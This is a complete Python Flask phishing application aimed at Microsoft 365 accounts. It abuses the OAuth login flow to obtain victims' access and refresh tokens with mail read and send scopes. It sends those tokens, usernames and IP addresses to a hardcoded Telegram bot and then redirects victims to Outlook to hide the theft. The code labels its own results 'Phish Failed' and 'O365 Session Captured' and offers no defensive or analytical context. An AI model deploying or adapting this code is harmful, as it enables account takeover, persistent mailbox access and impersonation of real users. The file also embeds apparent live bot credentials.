from flask import Flask, request, redirect, session
import requests
import urllib.parse
import os
import base64
import json
import uuid

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-me')

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Use a specific Client ID if you have one. 
# 147947b0 is a public "permissive" ID, but it's risky if Azure changes behavior.
MS_CLIENT_ID = "147947b0-1073-4b4c-88e1-9f7295f29b3f"

# CRITICAL: This MUST match exactly the URI the user hits when MS redirects back.
# If you want the user to land on your root, use root. But /callback is standard.
MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback"
MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send"

def send_to_telegram(username, access_token, refresh_token, ip, error_msg=None):
    """Sends the captured keys to your Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Sanitize input to prevent HTML breakage in Telegram
    username = username.replace('<', '&lt;').replace('>', '&gt;') if username else "Unknown"
    access_token = access_token.replace('<', '&lt;').replace('>', '&gt;') if access_token else "FAILED"
    refresh_token = refresh_token.replace('<', '&lt;').replace('>', '&gt;') if refresh_token else "FAILED"
    error_msg = error_msg.replace('<', '&lt;').replace('>', '&gt;') if error_msg else ""

    if error_msg:
        text = f"""❌ <b>Phish Failed</b>

🌐 <b>IP:</b> {ip}
📝 <b>Error:</b>
<code>{error_msg}</code>
"""
    else:
        text = f"""
🛡️ <b>O365 Session Captured</b>

👤 <b>User:</b> {username}
🌐 <b>IP:</b> {ip}

🔑 <b>ACCESS TOKEN:</b>
<code>{access_token}</code>

🔄 <b>REFRESH TOKEN:</b>
<code>{refresh_token}</code>
"""
    
    try:
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }, timeout=10)
        print(f"Telegram Response: {resp.status_code} - {resp.text}")
    except Exception as e:
        print(f"Telegram Send Error: {e}")

@app.route("/")
def start():
    """Redirects the user to the real Microsoft Login page."""
    # Generate a random state to prevent CSRF
    state = str(uuid.uuid4())
    session['oauth_state'] = state
    
    params = {
        "client_id": MS_CLIENT_ID,
        "response_type": "code",
        "scope": MS_SCOPE,
        "redirect_uri": MS_REDIRECT_URI,
        "prompt": "select_account",
        "state": state
    }
    ms_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urllib.parse.urlencode(params)}"
    return redirect(ms_url)

@app.route("/callback")
def callback():
    """Exchanges the code for tokens and sends them to Telegram."""
    auth_code = request.args.get('code', '')
    error = request.args.get('error', '')
    state = request.args.get('state', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Verify state
    if state != session.get('oauth_state'):
        send_to_telegram("N/A", "N/A", "N/A", ip, "State Mismatch (CSRF Detected)")
        return redirect("https://outlook.office365.com/")

    if error:
        error_description = request.args.get('error_description', 'Unknown Error')
        send_to_telegram("N/A", "N/A", "N/A", ip, f"Auth Error: {error} - {error_description}")
        return redirect("https://outlook.office365.com/")

    if not auth_code:
        send_to_telegram("N/A", "N/A", "N/A", ip, "No code received")
        return redirect("https://outlook.office365.com/")

    token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": MS_CLIENT_ID,
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": MS_REDIRECT_URI,
        "scope": MS_SCOPE
    }
    
    try:
        response = requests.post(token_url, data=data, timeout=15)
        
        # Log the raw response for debugging
        print(f"Token Exchange Response: {response.status_code} - {response.text}")
        
        if response.status_code != 200:
            send_to_telegram("N/A", "N/A", "N/A", ip, f"Token Exchange Failed (HTTP {response.status_code}): {response.text}")
            return redirect("https://outlook.office365.com/")
            
        tokens = response.json()
        
        # Extract username from ID Token
        username = "Unknown"
        if "id_token" in tokens:
            try:
                payload = tokens["id_token"].split('.')[1]
                # Fix base64 padding
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                user_info = json.loads(base64.urlsafe_b64decode(payload))
                username = user_info.get("preferred_username", "Unknown")
            except Exception as e:
                print(f"ID Token Decode Error: {e}")
            
        access_token = tokens.get("access_token", "FAILED")
        refresh_token = tokens.get("refresh_token", "FAILED")
        send_to_telegram(username, access_token, refresh_token, ip)
        
    except Exception as e:
        import traceback
        traceback.print_exc()
        send_to_telegram("N/A", "N/A", "N/A", ip, f"Exception: {str(e)}")

    # Redirect to a "legitimate" looking page
    return redirect("https://outlook.office365.com/")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
